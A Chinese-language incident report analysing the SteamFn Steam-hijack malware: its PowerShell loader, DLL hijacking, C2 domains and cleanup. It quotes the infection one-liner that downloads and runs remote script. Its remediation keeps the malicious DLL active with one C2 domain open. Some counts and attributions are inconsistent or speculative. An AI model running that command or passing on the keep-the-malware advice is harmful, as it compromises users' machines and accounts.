---
title: "SteamFn 恶意软件分析与处置报告"
description: "整理 SteamFn 恶意软件的 PowerShell 加载器、DLL 劫持、C2 基础设施与处置过程。"
pubDate: 2026-06-15
updatedDate: 2026-06-15
cover: "/blog-covers/cover-01.webp"
tags: ["SteamFn", "Malware Analysis", "Incident Response", "Windows"]
category: "tech"
---

## 事件概述

**日期**：2026-06-15
**受害者主动执行了恶意命令**：`irm steamfn.com | iex`

该命令下载并执行了一段 PowerShell 脚本，将 DLL 劫持恶意软件植入 Steam 目录，伪装为 SteamTools 游戏解锁工具。

---

## 攻击链分析

### 第一阶段：PowerShell 加载器（steamfn.com）

```
irm steamfn.com | iex
    │
    ▼
PowerShell 脚本（仅当 User-Agent 包含 WindowsPowerShell 时下发）
    │
    ├── 强制终止 steam.exe（taskkill /f）
    ├── 读取注册表 HKCU\Software\Valve\Steam 获取 SteamPath
    ├── 删除 steam.cfg、package\beta（清理此前痕迹）
    ├── Add-MpPreference -ExclusionPath（添加 Defender 白名单）
    ├── 下载 xinput1_4.dll（update.steamfn.com/update）→ 写入 Steam 目录
    ├── 下载 dwmapi.dll（update.steamfn.com/dwmapi）→ 写入 Steam 目录
    ├── 写入 HKCU\Software\Valve\Steamtools\iscdkey = "true"
    ├── 启动 Steam（xinput1_4.dll 随 Steam 进程加载）
    ├── 删除 %USERPROFILE%\get.ps1（自身脚本）
    └── 杀掉父 PowerShell 进程（自毁）
```

### 第二阶段：DLL 劫持

Steam 启动时自动加载同目录下的 `xinput1_4.dll`（XInput 手柄库）。恶意 DLL 通过 `DllMain` 在 Steam 进程内执行代码，获得完全进程权限。

### 第三阶段：持久化与 C2 通信

DLL 启动后：
1. 连接 4 个 C2 服务器进行版本检测（同时激活"解锁"功能）
2. 创建 `Global\Vale_SteamIPC_Class` mutex（仿冒 Steam 官方 IPC 名称 "Valve"）
3. 具备线程注入、进程枚举、键盘 hook、凭证窃取能力

---

## 恶意 DLL 技术分析

### xinput1_4.dll

| 属性 | 值 |
|------|-----|
| 内部名称 | update.dll |
| SHA256 | 0EFD139F4201AEA356B6BADDB159534BADFEB388BB7DD54EE9D614F166CC64A2 |
| 大小 | 673,784 bytes |
| 编译时间 | 2026-03-13 15:56:25 |
| PDB 路径 | `I:\sTCode\x64\Release\update.pdb` |
| 链接器版本 | MSVC 14.44 |
| 数字签名 | GlobalSign GCC R45 EV CodeSigning CA 2020 |
| 签名实体 | **NewWnight Global Tech Co., Ltd**（深圳新晔环球科技有限公司） |

**导出函数**：78 个 cJSON_* 函数（完整 cJSON 库），非正常 XInput 函数

**嵌入第三方库**：
- libcurl/7.68.0-DEV（完整 HTTP/HTTPS 客户端）
- zlib 1.2.13（inflate 压缩/解压）

**关键导入 API（危害能力）**：

| 类别 | API | 用途 |
|------|-----|------|
| 进程操作 | CreateToolhelp32Snapshot, Thread32First, Thread32Next | 枚举系统进程/线程 |
| 线程注入 | SuspendThread, ResumeThread, GetThreadContext, SetThreadContext | 代码注入 |
| 内存操作 | VirtualAlloc, VirtualProtect | shellcode 执行 |
| 凭证窃取 | CryptQueryObject, CertOpenStore, QueryCredentialAttributes | 访问 Windows 证书/凭证 |
| 加密通信 | EncryptMessage, DecryptMessage | SChannel 加密 C2 流量 |
| 反调试 | IsDebuggerPresent | 检测调试器 |

### dwmapi.dll

| 属性 | 值 |
|------|-----|
| 大小 | 136,120 bytes |
| 编译时间 | 2026-03-15 16:41:18 |
| PDB 路径 | `C:\Users\ASUS\source\repos\Project2\x64\Release\dwmapi.pdb` |
| 签名实体 | 同上（NewWnight Global Tech Co., Ltd） |
| 导出函数 | **无**（纯副作用 DLL，DllMain 即执行） |

**开发线索**：PDB 路径包含中文用户名 "ASUS"，项目名 "Project2"——典型的中国境内开发环境

### C2 基础设施

| 域名 | 伪装类型 | 状态 |
|------|----------|------|
| `update.steamfn.com` | 主分发站 | 活跃 |
| `update.steamcdn.com` | Steam CDN | 活跃（Cloudflare） |
| `update.wudrm.com` | Windows DRM | 活跃（中国境内 IP） |
| `update.aaasn.com` | 无明确伪装 | 活跃（中国境内 IP） |
| `update.tnkjmec.com` | 随机短域名 | 活跃（Cloudflare） |

---

## 关键发现：steamtools.net = steamfn.com

**steamtools.net 与 steamfn.com 是同一攻击团伙运营。**

证据：
- 两者下载的 DLL 编译自相同 Visual Studio 项目（相同 PDB 路径）
- 共享相同的 4 个 C2 服务器
- 相同的数字签名实体
- steamfn.com 版本 DLL 比 steamtools.net 多绑定 1 个 C2 域名（迭代升级版）

域名分析：`steamfn.com` 中 "fn" 极可能为 **Fishing Net**（渔网）缩写，暗示钓鱼/盗号目的。

---

## 处置过程

### 1. 账号安全（手机操作）
- 修改 Steam 密码
- 撤销所有设备授权
- 确认 Steam Guard 手机验证器开启

### 2. 恶意软件清除
- 删除 `xinput1_4.dll`、`dwmapi.dll` 等恶意 DLL
- 清除 `HKCU\Software\Valve\Steamtools` 注册表
- 清除 `%LOCALAPPDATA%\steam`、`%LOCALAPPDATA%\Microsoft\Tencent` 缓存

### 3. 方案选择

用户需要保留游戏解锁功能，选择**方案 B**：保留 DLL 功能，封死 C2 通信。

**核心矛盾**：DLL 的解锁功能与版本检测走同一通信通道。必须至少放行 1 个 C2 域名。

### 4. 精准网络封锁

通过逐一排除法测试，确定以下配置：

**封锁 3 个 C2，仅放行 aaasn：**

```powershell
$blockIPs = @()
foreach ($d in @("update.steamcdn.com", "update.wudrm.com", "update.tnkjmec.com")) {
    try { $blockIPs += [System.Net.Dns]::GetHostAddresses($d) | % { $_.IPAddressToString } } catch {}
}
$blockIPs = $blockIPs | Sort-Object -Unique
New-NetFirewallRule -DisplayName "Block_3C2" -Direction Outbound -RemoteAddress $blockIPs -Action Block -Protocol Any
```

### 5. 防御体系

| 层级 | 措施 | 作用 |
|------|------|------|
| 1 | DLL 只读属性 | 防止被替换 |
| 2 | SHA256 哈希基线 | 校验 DLL 完整性 |
| 3 | Windows 防火墙出站规则 | 封锁 3 个 C2 域名 IP |
| 4 | 审计日志 | 记录被拦截的连接尝试 |
| 5 | 桌面 Check-Steam.bat | 双击一键体检 |
| 6 | 手机 Steam Guard | 异常登录实时通知 |

---

## Steam 更新后的恢复流程

Steam 客户端更新后游戏解锁可能暂时失效。恢复步骤：

1. **全放行**：`Get-NetFirewallRule -DisplayName "Block_3C2" | Remove-NetFirewallRule`
2. 启动 SteamTools → 启动 Steam → 确认游戏恢复正常
3. **重新封锁**：执行上文精准网络封锁脚本
4. 启动 Steam → 确认游戏仍在

原因：Steam 更新后 DLL 需要连 C2 重新获取 hook 配置，满血放行一次后缓存即写入本地。

---

## 当前部署状态

```
劫持 DLL：     xinput1_4.dll（SHA256: 0EFD13...）

C2 封锁状态：
  steamfn.com         ❌ 封锁
  steamcdn.com        ❌ 防火墙
  wudrm.com           ❌ 防火墙
  tnkjmec.com         ❌ 防火墙
  aaasn.com           ✅ 放行（版本检测唯一出口）
```

---

